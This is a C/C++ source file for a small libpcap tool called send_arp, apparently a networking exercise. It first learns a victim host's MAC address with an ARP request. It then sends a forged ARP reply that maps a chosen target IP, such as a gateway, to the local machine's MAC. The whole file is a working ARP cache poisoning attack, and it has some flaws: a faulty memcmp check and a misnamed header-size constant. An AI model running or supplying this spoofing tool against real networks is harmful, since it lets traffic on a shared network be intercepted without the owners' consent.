#include <pcap.h>
#include <stdio.h>
#include <stdint.h>
#include <string.h>
#include <stdlib.h>

#include <sys/socket.h>
#include <arpa/inet.h>
#include <net/ethernet.h>
#include <sys/ioctl.h>
#include <net/if.h>

#define IP_HEADER_SIZE 14
#define ARP_HEADER_SIZE 28

typedef struct myArp{
	uint16_t hType;
	uint16_t pType;
	uint8_t hLength;
	uint8_t pLength;
	uint16_t OPcode;
	uint8_t senderMac[6];
	uint8_t senderIP[4];
	uint8_t targetMac[6];
	uint8_t targetIP[4];
}myArp;

typedef struct myEthernet{
	uint8_t desMac[6];
	uint8_t srcMac[6];
	uint16_t type;
}myEthernet;

void arpRulesPacket(struct myArp *arp, u_char *senderMac, char *senderIP, u_char *targetMac, char *targetIP, uint16_t OPcode=0x0002) {
	arp->hType = ntohs(0x0001);
	arp->pType = ntohs(0x0800);
	arp->hLength = 0x06;
	arp->pLength = 0x04;
	arp->OPcode = ntohs(OPcode);
	memcpy(arp->senderMac, senderMac, 6);
	inet_pton(AF_INET, senderIP, &arp->senderIP);
	memcpy(arp->targetMac, targetMac, 6);
	inet_pton(AF_INET, targetIP, &arp->targetIP);
}

void arpRulesEthernet(struct myEthernet *ethernet, u_char *desMac, u_char *srcMac) {
	memcpy(ethernet->desMac, desMac, 6);
	memcpy(ethernet->srcMac, srcMac, 6);
	ethernet->type = ntohs(0x0806);
}

void getMyMac(char *dev, u_char *mac) {
	struct ifreq s;
    	int fd = socket(PF_INET, SOCK_DGRAM, IPPROTO_IP);

	s.ifr_addr.sa_family = AF_INET;
    	strncpy(s.ifr_name, dev, IFNAMSIZ-1);

    	ioctl(fd, SIOCGIFHWADDR, &s);
	memcpy(mac, (u_char*)s.ifr_hwaddr.sa_data, 6);
}

char *getMyIP(char *dev) {
	struct ifreq s;
    	int fd = socket(AF_INET, SOCK_DGRAM, 0);
	char *ip; 

	s.ifr_addr.sa_family = AF_INET;
	strncpy(s.ifr_name, dev, IFNAMSIZ-1);

	ioctl(fd, SIOCGIFADDR, &s);
	ip = inet_ntoa(((struct sockaddr_in *)&s.ifr_addr)->sin_addr);
	
	return ip;
}

void usage() { printf("syntax: send_arp <interface> <sender ip> <target ip>\n"); }

int main(int argc, char* argv[]) {
	if (argc != 4) { usage(); return -1; }

	char* dev = argv[1];
	char errbuf[PCAP_ERRBUF_SIZE];
	pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
	if (handle == NULL) { fprintf(stderr, "couldn't open device %s: %s\n", dev, errbuf); return -1; }
	
	struct myArp arp, *rep_arp;
	struct myEthernet ethernet, *rep_ethernet;
	
	u_char *my_Mac = (u_char*)malloc(6);
	getMyMac(dev, my_Mac);
	char *my_IP = getMyIP(dev);

	char *sender_IP = argv[2], *target_IP = argv[3];
	u_char *sender_Mac = (u_char*)malloc(6);
	
	u_char temp[6] = {0xff, 0xff, 0xff, 0xff, 0xff, 0xff}, temp2[6] = {0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
	arpRulesEthernet(&ethernet, temp, my_Mac);
	arpRulesPacket(&arp, my_Mac, my_IP, temp2, sender_IP, 0x0001);
	
	u_char *requestPacket;
	requestPacket = (u_char *)malloc(sizeof(char)*(IP_HEADER_SIZE+ARP_HEADER_SIZE));
	memcpy(requestPacket, &ethernet, IP_HEADER_SIZE);
	memcpy(requestPacket+IP_HEADER_SIZE, &arp, ARP_HEADER_SIZE);
	
	if(pcap_sendpacket(handle,requestPacket,42)!= 0) {
		fprintf(stderr,"send error: %s\n",pcap_geterr(handle));
		return -1;
	}

	while(1) {
		struct pcap_pkthdr *header;
		const u_char *packet;
		int res = pcap_next_ex(handle,&header,&packet);
		if(res == 0) continue;
		if(res == -1 || res == -2 ) break;
		
		rep_ethernet = (struct myEthernet*)packet;
			
		if(ntohs(rep_ethernet->type) == 0x0806 ) {
			rep_arp = (struct myArp*)(packet+IP_HEADER_SIZE);

			if(memcmp((u_char *)&arp.targetIP, (u_char *)rep_arp->senderIP, 4) != -1) {
				sender_Mac = (u_char *)rep_arp->senderMac;
				break;
			}
		}
	}

	arpRulesEthernet(&ethernet, sender_Mac, my_Mac);
	arpRulesPacket(&arp, my_Mac, target_IP, sender_Mac, sender_IP);

	u_char *replyPacket;
	replyPacket = (u_char *) malloc(sizeof(char)*(IP_HEADER_SIZE+ARP_HEADER_SIZE));
	memcpy(replyPacket, &ethernet, IP_HEADER_SIZE);
	memcpy(replyPacket+IP_HEADER_SIZE, &arp, ARP_HEADER_SIZE);

	if(pcap_sendpacket(handle, replyPacket, (IP_HEADER_SIZE+ARP_HEADER_SIZE)) != 0) {
		fprintf(stderr, "Arp Packet Send Error : %s\n", pcap_geterr(handle));
		return 0;
	}

	pcap_close(handle);
	return 0;
}
